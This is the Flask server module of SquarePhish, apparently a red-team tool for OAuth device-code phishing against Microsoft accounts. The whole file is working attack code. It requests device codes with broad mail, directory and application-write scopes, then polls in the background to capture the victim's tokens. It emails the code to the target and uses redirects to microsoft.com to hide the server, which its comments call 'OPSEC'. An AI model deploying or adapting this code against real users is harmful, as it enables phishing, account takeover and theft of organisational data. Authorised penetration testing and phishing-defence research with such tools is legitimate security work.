# Copyright 2022 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import urllib
import logging
import requests
from flask import request  # type: ignore
from flask import redirect  # type: ignore
from configparser import ConfigParser
from squarephish.utils import HTTP_HEADERS
from squarephish.modules.emailer import Emailer
from squarephish.modules.server.auth import AuthPoll
from squarephish.modules.server.email import email_usercode
from squarephish.modules.server.customflask import CustomFlask

# Create global Flask app based on config.py
app = CustomFlask(__name__)
app.config.from_pyfile("config.py")


def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
    """Initialize the Custom Flask app route

    For better OPSEC, if any errors occur, automatically redirect the user away
    from our server to the main Microsoft web page

    :param config:  configuration settings
    :param emailer: emailer object to send emails
    """
    route = config.get("SERVER", "ENDPOINT").strip("/")
    route = f"/{route}"

    @app.errorhandler(404)
    def handle_404(e):
        """Handle 404 errors here"""
        logging.error(f"Invalid URL request '{request.url}' from {request.remote_addr}")
        return redirect("https://microsoft.com/", code=302)

    @app.route(route, methods=["GET"])
    def run_devicecode_flow():
        """Primary route handling for Flask app"""

        # Get user information from the incoming request
        target_email = request.args.get("email")
        if not target_email:
            logging.error(f"Could not retrieve target email address: '{request.url}' from {request.remote_addr}")  # fmt: skip
            return redirect("https://microsoft.com/", code=302)

        # Validate the email address since we use this value as a filename on
        # the system
        target_email = target_email.strip()
        valid_email_regex = re.compile(r"^\b[A-Za-z0-9._#%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b$")  # fmt: skip
        if not re.fullmatch(valid_email_regex, target_email):
            logging.error(f"Invalid email address provided: '{request.url}' from {request.remote_addr}")  # fmt: skip
            return redirect("https://microsoft.com/", code=302)

        # Build the permissions scope
        # user.read mail.read contacts.read user.basic.all user.read.all directory.accessasuser.all application.readwrite.all
        scope = config.get("SERVER", "PERMISSION_SCOPE")
        logging.info(f"[{target_email}] Requesting scope:  {scope}")
        logging.info(f"[{target_email}] Requesting client: {config.get('SERVER', 'CLIENT_ID')}")  # fmt: skip

        # Build our request
        url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
        params = (("client_id", config.get("SERVER", "CLIENT_ID")), ("scope", scope))
        data = urllib.parse.urlencode(params)

        # Submit POST request to Microsoft
        try:
            resp = requests.post(url, headers=HTTP_HEADERS, data=data, verify=False)
        except requests.exceptions.ConnectionError as e:
            logging.error(f"[{target_email}] Failed to request device code from Microsoft: {e}")  # fmt: skip
            return redirect("https://microsoft.com/devicelogin", code=302)

        if resp.status_code != 200:
            logging.error(f"[{target_email}] Invalid response from /devicecode:\n{resp.json()}")  # fmt: skip
            return redirect("https://microsoft.com/devicelogin", code=302)

        devicecode_response = resp.json()
        logging.info(f"[{target_email}] Device code auth response:\n{devicecode_response}")  # fmt: skip
        logging.info(f"[{target_email}] Code successfully retrieved.")
        logging.info(f'[{target_email}] Message: {devicecode_response["message"]}')

        # Build URL and data for POST request to start device flow
        url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
        params = (
            ("grant_type", "urn:ietf:params:oauth:grant-type:device_code"),
            ("code", devicecode_response["device_code"]),
            ("client_id", config.get("SERVER", "CLIENT_ID")),
        )
        data = urllib.parse.urlencode(params)

        # Start polling for auth
        t = AuthPoll(
            target_email=target_email,
            devicecode_response=devicecode_response,
            url=url,
            data=data,
        )
        t.start()

        # Send our code to the victim
        emailed = email_usercode(
            email_template=config.get("SERVER", "EMAIL_TEMPLATE"),
            subject=config.get("SERVER", "SUBJECT"),
            from_email=config.get("SERVER", "FROM_EMAIL"),
            to_email=target_email,
            user_code=devicecode_response["user_code"],
            emailer=emailer,
        )

        if not emailed:
            logging.error(f"[{target_email}] Failed to send victim device code email")

        # Redirect to Microsoft Device Login
        return redirect("https://microsoft.com/devicelogin", code=302)
